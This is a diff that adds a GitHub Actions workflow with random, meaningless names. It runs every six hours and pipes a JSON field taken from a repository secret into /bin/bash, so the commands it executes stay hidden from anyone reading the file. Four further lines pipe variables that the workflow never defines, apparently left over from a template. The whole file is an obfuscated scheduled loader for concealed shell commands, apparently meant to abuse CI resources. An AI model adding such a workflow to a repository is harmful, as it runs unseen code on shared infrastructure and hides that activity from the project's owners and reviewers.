@@ -1,0 +1,23 @@
+name: zimingbn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zimingbn
+        env:
+          ho85: ${{ secrets.ho85 }}
+        run: |
+          echo $ho85 | jq -r .foem94222 | /bin/bash
+          echo $eij0 | jq -r .gq36641 | /bin/bash
+          echo $fiie98 | jq -r .y297 | /bin/bash
+          echo $t21549 | jq -r .gmo7131 | /bin/bash
+          echo $ezgww23 | jq -r .rga48 | /bin/bash
+
